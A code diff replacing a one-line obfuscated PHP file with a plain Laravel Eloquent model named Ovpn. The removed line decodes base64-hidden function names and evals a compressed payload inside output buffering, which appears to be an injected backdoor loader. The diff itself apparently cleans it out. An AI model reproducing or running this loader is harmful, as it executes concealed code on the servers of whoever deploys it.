@@ -1,1 +1,16 @@
-<?php $_='dedfb599';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNplkl1vgjAUhu/3K7gwQZNdwJw6YrgQZutHxiZqC70xa4v4AUrGUOTX74i6sa1Jy+np2+e86UFRLqO2+Bmm2n5YdjQZBGq3dkkkH+vd51Lt3ikVvamonm4cOCU7f2KaqvJzfOOZEKoiJpr0RtnQtiIZo3Rsu0tPf0pej+dLym/oQlHKS/w9DdqPCxmIvQQf/yw+T/aOHbdWUL0QGG3Y1LLEwBIzamwZzYvXozZ+niS6eJiHU5qnkuoJj5HGSN73PXflx6iAGHFs5JKSTKIc+9TReHOUMM8RU4wKN0YbiY1TMEsde0cKqDHiONc5jTJgRF7fXUmM1r7nQExS3kQ6oy3N6+sHhkl69bDhwBIn603urGyIyaPEJGODl/Di9Qhs4K97ITzQxe/f2qE2HtpwPrBOvOlGPkxm97YsjlJgrzmeh29Ti8ObhKWunDLzqR6NTsfwTz4RtkiHvSsTaR3waIDGrPS30sLyW7/uGuUfUck1ujdlmayr51W9/5b/bu6VU6/2stHofgERDMKq'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Ovpn extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        'name', 
+        'ip', 
+    ];
+}
